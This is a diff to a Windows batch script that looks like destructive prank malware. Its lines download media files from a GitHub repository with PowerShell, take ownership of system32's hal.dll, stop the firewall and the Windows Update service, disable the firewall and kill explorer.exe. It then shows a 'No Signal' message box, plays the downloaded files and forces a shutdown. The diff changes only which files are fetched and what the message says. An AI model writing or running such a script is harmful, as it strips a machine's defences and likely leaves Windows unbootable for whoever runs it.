@@ -28,7 +28,8 @@ md your
 cd your
 md asylum
 
-powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/waterfull/raw/main/Video_be6704a6-e912-4494-b492-67da48a10817.mp4','C:\your\asylum\Video_be6704a6-e912-4494-b492-67da48a10817.mp4')"
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/Deep.mp3','C:\your\asylum\Deep.mp3')"
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/ooop.mp4','C:\your\asylum\ooop.mp4')"
 
 
 takeown /f "%systemdrive%\windows\system32\hal.dll"
@@ -48,10 +49,14 @@ net stop sharedaccess
 netsh firewall set opmode mode-disable
 net stop "wuauserv"
 taskkill /f /im explorer.exe
-echo Msgbox"May she rest in peace.",0+0,"LKR">>msg.vbs
+echo Msgbox"No Signal",0+0,"LKR">>msg.vbs
 
 start msg.vbs
-start max Video_be6704a6-e912-4494-b492-67da48a10817.mp4
+
+timeout /t 6
+
+start Deep.mp3
+start ooop.mp4
 
 timeout /t 17
 shutdown -s -t 17
